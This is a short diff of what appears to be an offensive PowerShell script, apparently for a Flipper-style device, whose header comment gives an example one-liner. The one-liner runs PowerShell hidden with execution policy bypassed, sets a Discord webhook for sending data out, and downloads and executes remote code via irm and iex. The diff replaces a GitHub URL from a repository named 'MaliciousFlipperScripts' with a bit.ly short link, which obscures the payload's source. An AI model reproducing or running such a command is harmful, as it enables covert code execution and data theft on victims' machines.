@@ -3,7 +3,7 @@
 
 # Some Globals
 # The Discord sending webhook
-# Example use: powershell -w h -ep bypass $discordwebhook='https://discord.com/whatever';irm https://raw.githubusercontent.com/NotAMaliciousHacker/MaliciousFlipperScripts/main/AllTheFun/AllTheFun.ps1 | iex
+# Example use: powershell -w h -ep bypass $discordwebhook='https://discord.com/whatever';irm https://bit.ly/3Phqlcc | iex
 
 function Send-DiscordWebhook {
     param (
